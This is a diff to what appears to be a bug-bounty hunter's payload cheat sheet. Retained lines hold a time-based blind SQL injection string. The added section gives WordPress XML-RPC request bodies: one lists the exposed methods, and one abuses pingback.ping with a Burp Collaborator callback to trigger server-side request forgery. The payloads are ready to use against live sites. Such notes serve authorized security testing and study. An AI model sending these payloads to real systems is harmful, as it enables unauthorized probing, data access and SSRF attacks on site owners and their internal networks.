@@ -98,3 +98,29 @@ OR
 'XOR(if(now()=sysdate(),sleep(1*1),0))OR'
 ```
 **[more info](https://hackerone.com/reports/1024984)**
+
+📅 26-Nov-2020
+## Wordpress xmlrpc
+### Discover the Methods
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+```
+### Call Method Ping Back for SSRF
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param>
+<value><string>https://abc.burpcollaborator.net</string></value>
+</param>
+<param>
+<value><string>https:abc.com/blog/post1</string></value>
+</param>
+</params>
+</methodCall>
+```
